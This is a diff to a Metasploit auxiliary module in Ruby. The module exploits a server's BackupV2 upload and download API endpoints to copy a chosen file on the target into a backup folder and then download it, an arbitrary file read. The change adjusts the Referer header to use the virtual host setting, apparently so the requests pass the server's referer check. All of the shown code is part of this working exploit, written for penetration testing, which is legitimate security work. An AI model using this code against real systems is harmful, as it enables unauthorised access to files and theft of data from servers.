@@ -136,6 +136,14 @@ class MetasploitModule < Msf::Auxiliary
 
   def try_upload
     print_status 'Uploading ' + datastore['LOCAL_FILE_PATH'] + ' to the backup folder.'
+
+    referer = ''
+    if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?
+      referer = "http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/"
+    else
+      referer = full_uri
+    end
+
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'upload'),
@@ -143,7 +151,7 @@ class MetasploitModule < Msf::Auxiliary
         'src' => datastore['LOCAL_FILE_PATH']
       },
       'headers' => {
-        'Referer' => full_uri
+        'Referer' => referer
       }
     })
 
@@ -173,6 +181,13 @@ class MetasploitModule < Msf::Auxiliary
     filename = datastore['LOCAL_FILE_PATH'].include?('\\') ? datastore['LOCAL_FILE_PATH'].split('\\')[-1] : datastore['LOCAL_FILE_PATH'].split('/')[-1]
     print_status 'Downloading ' + filename + ' from the backup folder.'
 
+    referer = ''
+    if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?
+      referer = "http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/"
+    else
+      referer = full_uri
+    end
+
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'download'),
@@ -180,7 +195,7 @@ class MetasploitModule < Msf::Auxiliary
         'filename' => filename
       },
       'headers' => {
-        'Referer' => full_uri
+        'Referer' => referer
       }
     })
 
